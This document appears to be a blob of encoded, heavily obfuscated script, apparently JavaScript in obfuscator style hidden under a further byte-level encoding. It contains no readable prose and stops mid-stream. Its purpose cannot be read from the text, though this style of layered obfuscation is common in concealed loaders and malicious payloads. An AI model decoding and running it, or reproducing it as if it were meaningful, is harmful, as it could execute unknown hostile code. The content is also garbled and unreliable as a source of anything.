µýù÷õ³æöî¦í»ëòùë¼ù÷òù¸¸»ùä¸«°½ª·±°öò÷¥¬»ª«¬°þÿããå£òù§³¬±ùä³æöî¦ééîòùôëù÷òù¤­°ùä³æöî¦æº¸òùë¼ù÷òùº¿¤ùä³æöî¦æìíòù°ù÷õ³æöî¦æ½¿òùéÿ­ù÷òù§ùä¸«°½ª·±°öò÷¥¬»ª«¬°þãããå£òù¸º¦ùä³æöî¦éºæòùì±ù÷õ³æöî¦æìèòùµýù÷òù½¤ùä¸«°½ª·±°öò÷¥¬»ª«¬°þãããå£òù§¤¯ùä³æöî¦çïìòùî½ù÷õ³æöî¦êº½òùé¸ù÷òù¦®³ùä³æöî¦ì½¼òùîù÷òù¯«¦ùä³æöî¦èïçòù´ºù÷òù­«¼´ùä³æöî¦ïçºòù·¼ïù÷õ³æöî¦íºéòùµýù÷òù®¯´ùä¸«°½ª·±°öò÷¥¬»ª«¬°þ¢¢å£òù«§ùä³æöî¦ëïçòùî³íù÷õù±°ùòù¤ùä¸«°½ª·±°öò÷¥¬»ª«¬°þàå£òùª·¼ùä¸«°½ª·±°öò÷¥¬»ª«¬°þõå£òù¤µ¯¨ùä¸«°½ª·±°ö÷¥¬»ª«¬°þö÷å£òù·¦¤ùä¸«°½ª·±°öòò÷¥¬»ª«¬°þöò÷å£òù¶¬ùä¸«°½ª·±°ö÷¥¬»ª«¬°þö÷å£òùùä³æöî¦»îòùºëèù÷õ³æöî¦êéíòùîù÷òù´½ùä¸«°½ª·±°öò÷¥¬»ª«¬°þö÷å£òù«§³¦ùä¸«°½ª·±°öò÷¥¬»ª«¬°þö÷å£òù©¸¯ùä¸«°½ª·±°öò÷¥¬»ª«¬°þãããå£òù³°²±´ùä³æöî¦íæìòù½«ù÷òù»°ùä³æöî¦ê»íòù­¦êù÷òù­°ùä¸«°½ª·±°öòòò©÷¥¬»ª«¬°þöòò©÷å£òùª¦­®ùä¸«°½ª·±°öò÷¥¬»ª«¬°þãããå£òù¬ùä³æöî¦ëîéòùç®ù÷òù±¿¤¶ùä¸«°½ª·±°öòò÷¥¬»ª«¬°þöò÷å£òù»½ùä¸«°½ª·±°öò÷¥¬»ª«¬°þãããå£òù´§¿ùä¸«°½ª·±°ö÷¥¬»ª«¬°þö÷å£òù¬µùä¸«°½ª·±°öò÷¥¬»ª«¬°þÿããå£òù·ª½¿ùä³æöî¦èèæòùîù÷òù¬¬«ùä¸«°½ª·±°öò÷¥¬»ª«¬°þõå£òù©»ùä³æöî¦íè¼òù´ºù÷õ³æöî¦êêèòù½«ù÷õù¾ùòùµ§ùä¸«°½ª·±°öò÷¥¬»ª«¬°þãããå£òù«½§ùä³æöî¦í¿éòù°ù÷õ³æöî¦»¿òùê©¯ù÷òù®½«ùä¸«°½ª·±°öò÷¥¬»ª«¬°þÿããå£òù±»ùä³æöî¦æºçòù¿³½éù÷òù»ùä³æöî¦ï½íòù¦±ù÷òùùä³æöî¦ïéìòù¦±ù÷òù¼´µùä³æöî¦ëèêòùë¼ù÷òù¶ùä³æöî¦¸êòùôëù÷òù¤ùä³æöî¦æç»òùæù÷òù´ùä³æöî¦ë¿çòù½«ù÷òù°µùä³æöî¦ç¼çòù·êù÷òù¯ùä³æöî¦íííòù¶ªëù÷òù´¸ùä³æöî¦íï¿òù¿³½éù÷òù²ùä³æöî¦ç»ºòùêïù÷òù¶¨­ùä³æöî¦í¿¿òù°ù÷òù¤¹ùä³æöî¦çíºòù¿³½éù÷òù®¦¯ùä³æöî¦ï¸çòù§ç¶ù÷òù±³©ùä³æöî¦ç¼êòù·êù÷òù³»ùä³æöî¦ïì¼òù¬ù÷òù½±ùä³æöî¦ïë¿òù³ù÷òùªùä³æöî¦éîçòùµýù÷òùµùä³æöî¦èï¸òùêïù÷òù¸®¤¦ùä³æöî¦êæèòùîù÷òù¼¹ùä³æöî¦ìæîòù½«ù÷òù¿ùä³æöî¦èèíòù«¹¤ù÷òù®»·ùä³æöî¦é»ëòù²êöêù÷òù¨¤¯ùä³æöî¦çíèòù¶ªëù÷òù¬ùä³æöî¦ïì¿òù·¼ïù÷òù¨±·®ùä³æöî¦éçæòùê©¯ù÷òù·²ºùä³æöî¦í¿æòùê©¯ù÷òùµùä³æöî¦ë¸»òùé´ù÷òù¶¿­ùä³æöî¦é»æòùé´ù÷òùª±·ùä³æöî¦æ¸¼òù³ù÷òù©©ùä³æöî¦èëíòùµ¤¼ûù÷òù¦ùä³æöî¦ê½ìòùÿéù÷òù´²ùä³æöî¦ï¸èòùî½ù÷òù²ùä³æöî¦¼½òù½«ù÷òùª³¤ªùä³æöî¦ìêçòù±ëù÷òùººùä³æöî¦ééïòù®ù÷òù³½ùä³æöî¦æïéòù¤û»ù÷òù³¹ùä³æöî¦êîçòù±ëù÷òù­¨¼ùä³æöî¦éïéòù½«ù÷òùººùä³æöî¦ìæ½òùîù÷òùª´ùä³æöî¦ï¼èòùêïù÷òù¯µùä³æöî¦é¿çòù§ç¶ù÷òù¤¸µ²ùä³æöî¦êéçòù·¼ïù÷òù»´°¦ùä³æöî¦éëéòù¤û»ù÷òù·®«¨ùä³æöî¦è¼íòù¬ù÷òùª¤ùä³æöî¦çí¼òùìù÷òù¸·ùä³æöî¦ëìíòù³ù÷òù±¨ùä³æöî¦ê¸ëòùµýù÷òù³²·¿ùä³æöî¦è¸íòùê©¯ù÷òù·¬°ùä³æöî¦éì¼òù¿³½éù÷òù¬¸©ùä³æöî¦ïíæòù°ù÷òùùä³æöî¦ëèìòù¤û»ù÷òù°²ùä³æöî¦éæ»òùù÷òù¶ùä³æöî¦ìèæòùî³íù÷òù²°ùä³æöî¦ìíïòùµ³ïù÷òùµ­½©ùä³æöî¦è½¼òù¸é¶ù÷òù¸¯©ùä³æöî¦ï¸êòùì±ù÷òù¬ùä³æöî¦èéæòù«¹¤ù÷òù»·®ùä³æöî¦¼íòùºëèù÷òù³»ùä³æöî¦ê¿¼òùµýù÷òù¯µ¼©ùä³æöî¦è¼ºòù´ºù÷òùºùä³æöî¦çé¸òùµ¤¼ûù÷òùºùä³æöî¦í¸»òùôûù÷òù¦ùä³æöî¦æ¼¼òù²êöêù÷òùª«»ùä³æöî¦éíºòù³ù÷òù­·¨ùä³æöî¦çèéòù¸é¶ù÷òù°¼ºùä³æöî¦í¿íòùì±ù÷òù»¤¶ùä³æöî¦æ¿¸òù¤û»ù÷òù¬¹ºùä³æöî¦ìì»òù­¦êù÷òù¨³ùä³æöî¦ìºïòù³ù÷òù¸µ³°©ùä³æöî¦çé¼òù²êöêù÷òù°±®²ùä³æöî¦è¸ìòù¬ù÷òù°¹ùä³æöî¦ìë¿òù´ºù÷òù®¬²·ùä³æöî¦ìîîòù¿³½éù÷òù¹¤ùä³æöî¦ìî¿òù·¼ïù÷òù¼¯°§ùä³æöî¦º½òùë¼ù÷òù¨µ»ùä³æöî¦æèêòù²êöêù÷òù©¹ùä³æöî¦ìììòùî½ù÷òù´©ùä³æöî¦è¿¼òù¸é¶ù÷òù°²³³ùä³æöî¦éçëòùéÿ­ù÷òù±¯¼·ùä³æöî¦ìéêòùî³íù÷òù¿­ùä³æöî¦èº½òù«¹¤ù÷òù¤¹ªùä³æöî¦ïçîòùù÷òù¬©±ùä³æöî¦ëºîòùéÿ­ù÷òù¸®ùä³æöî¦éç¸òùé¸ù÷òù³«·ºùä³æöî¦ê¼èòù¹½ù÷òù¼¶ùä³æöî¦ïïíòù«¹¤ù÷òù´ùä³æöî¦êæíòù«¹¤ù÷òù²»ùä³æöî¦æ¸½òùìù÷òùùä³æöî¦éºèòù¸èù÷òù³ùä³æöî¦íîºòù®ù÷òùùä³æöî¦è¿çòù­¤ù÷òù»±ùä³æöî¦ëêºòùé´ù÷òùµ®²©ùä³æöî¦ìéæòù±ëù÷òù·²ùä³æöî¦í»½òù§ç¶ù÷òù²¼¨ùä³æöî¦ë¸ïòù½«ù÷òùµ§ùä³æöî¦êêæòùæù÷òù¬»´»ùä³æöî¦æëîòù³ù÷òù®¬ùä³æöî¦êï»òùù÷òù»®ùä³æöî¦í¸æòùì±ù÷òù§ùä³æöî¦é»íòùôûù÷òù»±·ºùä³æöî¦çºèòùîù÷òù¹¦®ùä³æöî¦æææòù«¹¤ù÷òù¶´½ùä³æöî¦íëêòù¨§ù÷òù¦¼ªùä³æöî¦ëî»òù÷¬û½ù÷òù¹½¹ùä³æöî¦ê½¼òù¸é¶ù÷òù¦µ·»ùä³æöî¦½¼òù´ºù÷òù«ªùä³æöî¦ëç¸òù­¦êù÷òù¶°«ùä³æöî¦ìéëòù·¼ïù÷òù®¸¹ùä³æöî¦é¼¼òùê©¯ù÷òù«¯«¦ùä³æöî¦ë¿æòù¶ªëù÷òù¤¨´ùä³æöî¦êºæòùìù÷òù³¶·µùä³æöî¦æïæòù«¹¤ù÷òù½¹ùä³æöî¦è»¿òùç®ù÷òù±©±ùä³æöî¦æ¸íòù¬ù÷òù««ùä³æöî¦èìéòùôûù÷òù»§¼ùä³æöî¦ëîºòù­¤ù÷òù°ùä³æöî¦éºéòùºëèù÷òù¯µùä³æöî¦èæºòù²êöêù÷òù¤ùä³æöî¦ë»ïòù°ù÷òùµùä³æöî¦ëî¼òùµ¤¼ûù÷òù¬®²ùä³æöî¦ìïìòùµ³ïù÷òù±¼ùä³æöî¦ï¸ºòùéÿ­ù÷òù»¨½´ùä³æöî¦íï¸òù«®³ù÷òù¯»º°°ùä³æöî¦ì¼ïòùôëù÷òù²®ùä³æöî¦ìíèòù²êöêù÷òù«·ùä³æöî¦êçíòùôëù÷òù¯¯©ùä³æöî¦æêèòù¨§ù÷òù´¼¤ùä³æöî¦ì¿ïòù¦µù÷òù½¬µùä³æöî¦ì½îòùìù÷òù±ùä³æöî¦éíèòù·êù÷òù©µùä³æöî¦í¼ìòùî³íù÷òù¨ùä³æöî¦êîïòùî½ù÷òùº­½µ²ùä³æöî¦ëèïòù°ç¬ù÷òù··º®ùä³æöî¦ïíéòùì±ù÷òù¹¶ùä³æöî¦ììëòù¶ªëù÷òù¹´¹ùä³æöî¦ë¸ëòù¶ªëù÷òù°¨´ùä³æöî¦è¸ïòùæù÷òùùä³æöî¦ê¸íòù¸èù÷òù³ª¿ùä³æöî¦í¿êòùµ³ïù÷òù¶ùä³æöî¦çºéòù³ù÷òù¶¨­®·ùä³æöî¦æèîòùé¸ù÷òù¬§ùä³æöî¦ìº¼òù¬ù÷òù³³ùä³æöî¦çêîòùîù÷òù¹­°¼ùä³æöî¦¸íòùî½ù÷òù©§ùä³æöî¦êççòù·¼ïù÷òù­®ùä³æöî¦ç½ïòù·êù÷òù»°·ùä³æöî¦ëêéòù°ù÷òùºùä³æöî¦è»æòùµ³ïù÷òù¦®ªùä³æöî¦é¿ïòùîù÷òù·´ùä³æöî¦ëæ»òù¤û»ù÷òù«¦§ùä³æöî¦ì¿¿òùôëù÷òù®­µ¼ùä³æöî¦íçêòùê©¯ù÷òù´ùä³æöî¦ìé¼òù´ºù÷òù±°©ùä³æöî¦çº¿òù½«ù÷òù«ùä³æöî¦ïììòù¶ªëù÷òù«¶ùä³æöî¦éèíòùé¸ù÷òùµµ¿ùä³æöî¦ëí¿òù°ç¬ù÷òù´¦ùä³æöî¦èïèòù¬ù÷òù½ùä³æöî¦æº¿òùç®ù÷òù»¤ùä³æöî¦ìè»òùôûù÷òù§ª§ùä³æöî¦ë½íòù®ù÷òù³´½ùä³æöî¦íéæòù¿³½éù÷òù¦¤ùä³æöî¦ìïîòù«®³ù÷òùùä³æöî¦ìîèòùì±ù÷òù¹ª¿´ùä³æöî¦èï¼òù¹½ù÷òù«º¸®ùä³æöî¦çºîòùç®ù÷òù³­¿ùä³æöî¦ëèèòùé´ù÷òùµ¼±ùä³æöî¦çê¼òùù÷òù¤ùä³æöî¦ïîæòù´ºù÷òù¤½­ùä³æöî¦í¼½òù«¹¤ù÷òù«¼ª²³ùä³æöî¦ææ¸òùù÷òùùä³æöî¦ïçêòù²êöêù÷òù¶­ùä³æöî¦íêëòù´ºù÷òù³½¼ùä³æöî¦êæéòù¤û»ù÷òù·²½¯ùä³æöî¦ïºêòùºëèù÷òù°¦®ùä³æöî¦ïïºòù¿³½éù÷òù¤ªùä³æöî¦ææíòù¦±ù÷òù®¿¸ªùä³æöî¦ï¸éòù¸èù÷òùµ¤­ºùä³æöî¦ííêòùîù÷òù§«ùä³æöî¦ìîçòù¹½ù÷òù¶ùä³æöî¦ìëçòùç®ù÷òù°®­ªùä³æöî¦çêíòùºëèù÷òù´¤ùä³æöî¦ìì¿òùæù÷òùº®µùä³æöî¦ëï¸òùìù÷òù¯¼±ùä¸«°½ª·±°öò÷¥¬»ª«¬°þàãå£òù¨´»ùä¸«°½ª·±°öò÷¥¬»ª«¬°þâãå£òù¶ùä¸«°½ª·±°öò÷¥¬»ª«¬°þãããå£òù¯ùä³æöî¦ê»ºòùî½ù÷òù»©­¼ùä³æöî¦æèæòù­¤ù÷òù¿¼¦¶ùä³æöî¦é¸çòùîù÷òù­ùä³æöî¦íîæòù¸èù÷õ³æöî¦ïì»òùµ¤¼ûù÷õ³æöî¦ë¼æòù²êöêù÷òù¿º¦ùä³æöî¦ïçíòù¬ù÷òù¹¹¼ùä³æöî¦ì¼æòù¦µù÷òù¶ùä¸«°½ª·±°öò÷¥¬»ª«¬°þö÷å£òù¯¸¤ùä¸«°½ª·±°öò÷¥¬»ª«¬°þãããå£òù³­ùä³æöî¦éë»òù³ù÷òù©ùä³æöî¦æº»òù·¼ïù÷òù®³½¹ùä¸«°½ª·±°öò÷¥¬»ª«¬°þãããå£òù¯ùä³æöî¦ïê¿òù¸èù÷òùªºùä³æöî¦íëçòùù÷òù½¶¨ùä³æöî¦è¸çòù°ù÷õ³æöî¦ç½éòù·¼ïù÷õ³æöî¦ëïïòù·¼ïù÷õ³æöî¦êèèòù®ù÷õ³æöî¦íîçòù´ºù÷òù³¬ùä³æöî¦ê¸çòù±ëù÷òù¦§ùä¸«°½ª·±°ö÷¥¬»ª«¬°þö÷å£òù¨¨½ùä³æöî¦éêîòùù÷òù¯©¤¨ùä³æöî¦êíçòù¿³½éù÷òù¹¬ªùä¸«°½ª·±°öò÷¥¬»ª«¬°þÿããå£òù·ùä³æöî¦êæêòù°ù÷òù¨·±®²ùä¸«°½ª·±°öò÷¥¬»ª«¬°þÿãå£òù¹ùä³æöî¦íæ½òù°ù÷òù¦·ùä¸«°½ª·±°öòò÷¥¬»ª«¬°þöò÷å£òù½§«ùä³æöî¦êêíòù¸èù÷òù´¬¼ùä³æöî¦æ¼½òù«®³ù÷òù¹¹¼ùä¸«°½ª·±°öò÷¥¬»ª«¬°þö÷å£òù·ùä¸«°½ª·±°öò÷¥¬»ª«¬°þÿãå£òù¿ùä¸«°½ª·±°öòò÷¥¬»ª«¬°þöò÷å£òù½¼«·ùä¸«°½ª·±°öòòò©÷¥¬»ª«¬°þöòò©÷å£òù¸°½§ùä¸«°½ª·±°öò÷¥¬»ª«¬°þö÷å£òù¶¶´ùä¸«°½ª·±°öòòò©÷¥¬»ª«¬°þöòò©÷å£òù¿®²ùä¸«°½ª·±°öòò÷¥¬»ª«¬°þöò÷å£òù¼²°½ùä¸«°½ª·±°öòòò©òª÷¥¬»ª«¬°þöòò©òª÷å£òù°´¿¿ùä¸«°½ª·±°öòò÷¥¬»ª«¬°þöò÷å£òù°ùä³æöî¦ëëêòùµ³ïù÷òù«½µµùä³æöî¦ìí¿òù²êöêù÷òù°ùä¸«°½ª·±°öòòò©òª÷¥¬»ª«¬°þöòò©òª÷å£òùµùä³æöî¦êæ¼òùæù÷òù¦¯§ºùä³æöî¦è»½òùé´ù÷òù¬±ùä¸«°½ª·±°öòòò©òª÷¥¬»ª«¬°þöòò©òª÷å£òù¤¸µ­ùä¸«°½ª·±°öò÷¥¬»ª«¬°þö÷å£òùº¸¨ùä³æöî¦ëï»òùî½ù÷õù­ùòù±ùä¸«°½ª·±°öò÷¥¬»ª«¬°þö÷å£òù¦¶µùä³æöî¦ëé½òù¨§ù÷õ³æöî¦ç½ëòù¦µù÷õ³æöî¦çêçòùìù÷òù¯®·¸ùä³æöî¦íïèòùôûù÷õ³æöî¦ëæºòùÿéù÷õ³æöî¦ëºìòùîù÷òù®ùä³æöî¦êëìòù§ç¶ù÷òù·±©¨ùä¸«°½ª·±°öòò÷¥¬»ª«¬°þöò÷å£òù®¹¸ùä¸«°½ª·±°öò÷¥¬»ª«¬°þãããå£òùºùä³æöî¦íëæòùµýù÷òù¿¯ùä³æöî¦ë¿¸òùì±ù÷òùµùä¸«°½ª·±°ö÷¥¬»ª«¬°þö÷å£òù½ùä¸«°½ª·±°öò÷¥¬»ª«¬°þö÷å£òùªùä³æöî¦çíîòù¿³½éù÷òù«ªµ°ùä¸«°½ª·±°öò÷¥¬»ª«¬°þÿããå£òù¨§¦½ùä³æöî¦ìè½òùî³íù÷òù­¯²ùä³æöî¦í½îòùìù÷òù°º±ùä³æöî¦ëºæòùé¸ù÷õù±°ùòùµùä¸«°½ª·±°öò÷¥¬»ª«¬°þãããå£òù©ªùä³æöî¦ì¿æòù«®³ù÷òù§ùä³æöî¦íïîòù·¼ïù÷òù«ª¨ùä¸«°½ª·±°öòòò©òª÷¥¬»ª«¬°þöòò©òª÷å£òù¼ùä¸«°½ª·±°ö÷¥¬»ª«¬°þö÷å£òù¯µùä¸«°½ª·±°öò÷¥¬»ª«¬°þÿããå£òù¼·ùä¸«°½ª·±°öò÷¥¬»ª«¬°þâå£òù¦®¦¯ùä¸«°½ª·±°öò÷¥¬»ª«¬°þóå£òùµ¬¤ùä¸«°½ª·±°öò÷¥¬»ª«¬°þÿããå£òù²¤°ùä³æöî¦íæ»òù°ç¬ù÷òù½µ¤ùä¸«°½ª·±°öò÷¥¬»ª«¬°þñå£òù¿²¬ùä¸«°½ª·±°öò÷¥¬»ª«¬°þóå£òù´µùä³æöî¦æïîòù¬ù÷òù´¶ùä¸«°½ª·±°öò÷¥¬»ª«¬°þõå£òù©ùä³æöî¦é¼ºòù¤û»ù÷õ³æöî¦êí¸òùë¼ù÷òù­´««°ùä³æöî¦ïîíòù¹½ù÷õ³æöî¦æ¼ëòùîù÷õ³æöî¦é¿¼òù°ç¬ù÷õ³æöî¦ïº¸òùë¼ù÷òùº¨®ùä¸«°½ª·±°öò÷¥¬»ª«¬°þö÷å£òù¬½¯ùä¸«°½ª·±°öò÷¥¬»ª«¬°þö÷å£òùª¬®¤ùä¸«°½ª·±°öò÷¥¬»ª«¬°þÿããå£òù¤«§¬ùä¸«°½ª·±°öò÷¥¬»ª«¬°þÿããå£òù¬ùä³æöî¦çîºòù°ç¬ù÷òù¦ùä³æöî¦ï½ºòùìù÷òù®¼´·ùä¸«°½ª·±°öò÷¥¬»ª«¬°þõå£òù¬°ùä¸«°½ª·±°öò÷¥¬»ª«¬°þõå£òù²¤¸·ùä¸«°½ª·±°öò÷¥¬»ª«¬°þõå£òù³ª¿ùä³æöî¦ì½éòù¦±ù÷õ³æöî¦ì»ïòù·êù÷òù±«ùä³æöî¦è½çòù«®³ù÷òù«­®ùä³æöî¦í¸íòùµ¤¼ûù÷òù¶´ª¨ùä³æöî¦è¸¿òù½«ù÷òùªùä¸«°½ª·±°öò÷¥¬»ª«¬°þõå£òù±³¯ùä³æöî¦ïè¿òù¦µù÷õ³æöî¦çìæòù¸é¶ù÷õ³æöî¦ìïëòù¿³½éù÷òù³µ«»ùä³æöî¦ïïëòùµ³ïù÷õ³æöî¦ìïêòù«®³ù÷õ³æöî¦½çòùù÷òù«§§®¸ùä¸«°½ª·±°öò÷¥¬»ª«¬°þãããå£òù­´ùä³æöî¦çæ»òùôûù÷òù¼±ùä³æöî¦èê»òùîù÷òù±½¸ùä³æöî¦êæëòù±ëù÷òù»·ùä³æöî¦¼¼òùé´ù÷õù»ùòù©¬²ùä³æöî¦ì½ëòù·¼ïù÷õ³æöî¦æé¼òù³ù÷òù¦ùä³æöî¦íçºòù±ëù÷õ³æöî¦ëºéòùî³íù÷õ³æöî¦éééòù¦µù÷òù»²·ùä³æöî¦éæêòùî½ù÷õ³æöî¦èì¿òùë¼ù÷òù¦ºùä³æöî¦ç¿îòù«®³ù÷õ³æöî¦éºïòù²êöêù÷òù®­±µ¤ùä³æöî¦ë¿»òùî½ù÷õ³æöî¦æçæòùîù÷õ³æöî¦çæìòùî½ù÷£å·¸ö³æöî¦æ»ìòùôûù÷ö½±°¸·¹³æöî¦çë»òùµ³ïù÷õù°»ùò°«²²÷á½±°¸·¹³æöî¦èé¼òù¦µù÷õù°»ùäº»¸¿«²ª­³æöî¦ìîëòùéÿ­ù÷õù°»ù÷³æöî¦é¸ìòùéÿ­ù÷ö­»ª°ª»¬¨¿²ò¿­§°½ö÷ãà¥½±°­ªþ³çã³æåª¬§¥¿©¿·ªþ³³çöî¦ï½¿òùµ¤¼ûù÷õ³çöî¦ëè¼òùºëèù÷ö³çöî¦½ïòù«¹¤ù÷÷å£½¿ª½¶ö÷¥££òî¦ìì¸çõóî¦èîºôóî¦¿õóî¦íæè¼÷å»²­»¥·¸ö³æöî¦çìîòùîù÷ö³æöî¦íé¸òù­¤ù÷ò³æöî¦éïçòù§ç¶ù÷÷÷ª¬§¥³æöî¦é¿½òù¶ªëù÷ö³æöî¦ëì»òù¸èù÷ò³æöî¦ìëíòùºëèù÷÷á³æöî¦ïçïòùê©¯ù÷öòò÷ä¿©¿·ªþ³³æöî¦ìæ¿òù°ç¬ù÷õ³æöî¦ïéíòù¸èù÷ö³æöî¦é¸æòù¨§ù÷÷å£½¿ª½¶ö÷¥£»²­»¥½±°­ªþ©ã³æöî¦ìí½òù­¤ù÷ö÷å¸±¬ö½±°­ªþªò±¸þ³æöî¦çé½òùîù÷ö÷÷¥·¸ö³æöî¦ïèºòù§ç¶ù÷ö³æöî¦ï»¼òù·¼ïù÷ö©ò÷ò³æöî¦éèîòù§ç¶ù÷ö¸òî¦ìì¸½õî¦ïôóî¦ïè¸ºõóî¦ïôî¦¼¸ë÷÷÷¶³æöî¦¸éòù±ëù÷öª÷å£££³ù»¨ùù±°ùö³æöî¦æ»ïòùé´ù÷ò©ãà¥½±°­ªþ³³ã³æòªã¥ùµùä¸«°½ª·±°öò¯÷¥½±°­ªþ³ãå¬»ª«¬°þ³öî¦ì½½òùë¼ù÷öò¯÷å£òù¿ùä¸«°½ª·±°öò¯÷¥½±°­ªþ³ãå¬»ª«¬°þ³öî¦ê¿¿òù­¤ù÷öò¯÷å££å·¸ö³³öî¦éº¿òùé¸ù÷ö³³öî¦éº»òùÿéù÷ò³³öî¦é¼êòù°ù÷÷÷¥½±°­ªþã©ù·ºùò¯ã©³³öî¦ë½»òù¿³½éù÷å¸±¬ö½±°­ªþþ±¸þ¼´»½ª³³öî¦ï¼ìòù«®³ù÷ö¯÷÷¥²±¹¹»¬³³öî¦ë¼»òùîù÷ö³³öî¦éçîòù·¼ïù÷ö³³öî¦éçîòù·¼ïù÷ö³³öî¦íêºòù¹½ù÷ö³³öî¦ëéèòù°ç¬ù÷ö³³öî¦çìíòùéÿ­ù÷ö³³öî¦êíëòù­¤ù÷ò÷ò³³öî¦èºïòùôûù÷÷ò÷òùä¦ìîù÷ò¯³³öî¦æïíòùç®ù÷õ³³öî¦çîëòù°ù÷÷÷å££»²­»¥½±°­ªþ¶ãö³³öî¦ëº¿òù¿³½éù÷õù¬ù¢¢³³öî¦ìç½òùìù÷õù¬ù¢¢ùù÷³³öî¦æé½òù¸èù÷ö÷å·¸öÿ¶÷¬»ª«¬°ÿå¬»ª«¬°þª³³öî¦ì¿ìòùë¼ù÷öª³³öî¦ïî½òùî³íù÷ö©òª÷ò¶÷å££÷ò³ù»¨ùù±°ùö³æöî¦ç¸ìòù¤û»ù÷ò¿­§°½þ©ãà¥½±°­ªþ³ã³æå¿©¿·ªþ³öî¦éèºòùµ³ïù÷ö¶¿°º²»¬±«®¨»°ª­ò³ò©÷å£÷ò³ù»¨ùù±°ùö³æöî¦ì¿¸òù½«ù÷ò¿­§°½þ©ãà¥½±°­ªþ³ã³æå¸±¬ö½±°­ªþªþ±¸þ©÷¥·¸ö³öî¦ééèòùîù÷ö³öî¦æ»ëòùºëèù÷ò³öî¦ï»éòù¤û»ù÷÷÷¥·¸öÿ÷¬»ª«¬°þ°«²²å¬»ª«¬°þ³öî¦æîéòù³ù÷öñäîóçõñòùù÷å£»²­»þª¬§¥·¸öª³öî¦ííºòù¦±ù÷øøö³öî¦æèéòù­¤ù÷öª³öî¦ê¸ìòù¸èù÷³öî¦èè»òùì±ù÷õ³öî¦ë»íòùôëù÷òóî¦ïôóî¦çæ¿õóî¦íôóî¦çæ¸õóî¦ìèíè÷¢¢³öî¦ææéòùµýù÷öª³öî¦ìëêòùì±ù÷³öî¦ïêéòù³ù÷ò°«²²÷÷÷¥½±°­ªþ¯ã³öî¦ç¸îòù¦±ù÷ö½±°¸·¹³öî¦éèìòù²êöêù÷ò°«²²÷á½±°¸·¹³öî¦éç¼òùéÿ­ù÷äº»¸¿«²ª­³öî¦ì¸½òù¦µù÷å·¸öÿ¯÷½±°ª·°«»å½±°­ªþã­¿¨»»­­¿¹»³öî¦èìïòùÿéù÷öª³öî¦ìºìòù¿³½éù÷ù·ºù÷å·¸öÿ÷½±°ª·°«»å½±°­ªþ¸ã³öî¦êëéòù¨§ù÷ö½±°¸·¹³öî¦ìæºòùµ¤¼ûù÷õù¬ù¢¢º»¸¿«²ª­³öî¦ìæºòùµ¤¼ûù÷õù¬ùò³öî¦ëï¿òùîù÷÷ò¶ãª³öî¦èìíòùîù÷³öî¦èîîòùêïù÷òã½±°¸·¹³öî¦ëì¸òùé¸ù÷¢¢º»¸¿«²ª­³öî¦ìçíòù­¦êù÷¢¢³öî¦æç½òùêïù÷òã¿©¿·ªþ³öî¦çé»òùêïù÷ö¬»­±²¨»»¬­±°ò³ò³öî¦æ¼îòùÿéù÷ò¶ò³öî¦èì¼òùµýù÷÷ò°ã¿©¿·ªþ³öî¦ê½½òù½«ù÷ö¬»­±²¨»»¬­±°ò³òª³öî¦ê¼¼òùêïù÷³öî¦ïæíòù°ù÷õùªù¢¢ª³öî¦ëºçòù«¹¤ù÷³öî¦ëëæòùµ³ïù÷ò¶ò°«²²÷ò¤ã³öî¦éí½òùù÷ö·­¬±«®ò¶÷á¿©¿·ªþ³öî¦é»êòù´ºù÷ö¬»­±²¨»¬±«®¿³»ò³ò¶÷äùùòã³öî¦ïê»òù·êù÷øø°³öî¦íé¿òù±ëù÷á³öî¦êêêòù´ºù÷ö³öî¦éë¸òùìù÷ò°³öî¦ïë½òù°ç¬ù÷÷ä³öî¦è¿ïòù¦µù÷øø³öî¦¸¼òùê©¯ù÷ö³öî¦éæ¸òù¹½ù÷ò°³öî¦æººòùÿéù÷÷ò½ãá³öî¦ìî½òùç®ù÷ä³öî¦íêºòù¹½ù÷ö³öî¦íêçòù¬ù÷ö³öî¦çìçòù°ù÷ò³öî¦çîìòù§ç¶ù÷ö®»¬­±°·°»ò°÷÷òùù÷ò¿ã³öî¦ç»îòùç®ù÷á³öî¦ìëìòùé´ù÷ö³öî¦çèìòù¤û»ù÷ö³öî¦ëê¸òù´ºù÷ö³öî¦íì¼òù·¼ïù÷ò³öî¦æ»éòù°ù÷÷ò³öî¦éëíòù½«ù÷á³öî¦ç¸íòù²êöêù÷äùù÷òù¦î¿ù÷äùùòã¿©¿·ªþ³³öî¦ë¼éòù³ù÷õù»ùö¸ò¥ùª»¦ªùä³öî¦ïæ»òù§ç¶ù÷ö³öî¦ëïºòùéÿ­ù÷ö³öî¦ç»çòùé¸ù÷ö³öî¦½êòù«®³ù÷ö³öî¦çïçòù¬ù÷ö³öî¦æïºòù½«ù÷ö³öî¦æéêòùé¸ù÷ö³öî¦æè¼òùù÷ö³öî¦êïéòù®ù÷ö³öî¦ïïæòù¸èù÷ö³öî¦ïééòùµ³ïù÷ö³öî¦¸¸òùµýù÷ö³öî¦çé¿òù®ù÷ö³öî¦ëì½òùî³íù÷ö³öî¦íìêòù·¼ïù÷ö³öî¦ëêæòùîù÷ö³öî¦é¼æòù´ºù÷ò³öî¦ê¸½òù°ç¬ù÷÷ò³öî¦í¸¿òù°ù÷÷ò³öî¦éê¿òùî½ù÷ö®»¬­±°·°»ò÷÷òù¦î¿ù÷ò³öî¦ëº½òù¸é¶ù÷÷ò½÷òù¦î¿ù÷ò³öî¦éìêòùîù÷÷ò¤÷òù¦î¿ù÷ò¿÷ò³öî¦í¼çòù³ù÷÷òù◝¦ìîù÷ò³öî¦½íòùê©¯ù÷¢¢³öî¦çë¸òùîù÷÷òù¦î¿ù÷ò³öî¦ìêºòùìù÷÷òù³»°ª·±°­ùä³öî¦ìíîòù¿³½éù÷ò°³öî¦è»»òùôûù÷³öî¦ë½ëòùç®ù÷ö±±²»¿°÷£÷å·¸ö³öî¦ç¿éòùôûù÷øø¸­³öî¦èíêòù½«ù÷ö³öî¦çìëòù²êöêù÷÷÷ª¬§¥·¸ö³öî¦ìêïòùêïù÷ö³öî¦ïìèòùºëèù÷ò³öî¦ç¿çòù¦±ù÷÷÷¥½±°­ªþ´ã¸­³öî¦ïì½òù¦±ù÷õù°½ùö³öî¦éïêòùÿéù÷÷òºã¥£åº³öî¦ç¼ïòù¸èù÷ã´å·¸ö³öî¦èé»òù·¼ïù÷÷º³öî¦æîçòù¦±ù÷ã³öî¦ïèêòù³ù÷å·¸ö³öî¦ëçêòùµ³ïù÷ö³öî¦êæ¿òù§ç¶ù÷ò³öî¦æë½òù«®³ù÷÷÷¥º³öî¦è¸æòù¶ªëù÷ã³öî¦è¿ëòù®ù÷¢¢³öî¦èëêòù°ù÷å½±°­ªþã³öî¦éºçòùôëù÷³öî¦éé¸òùé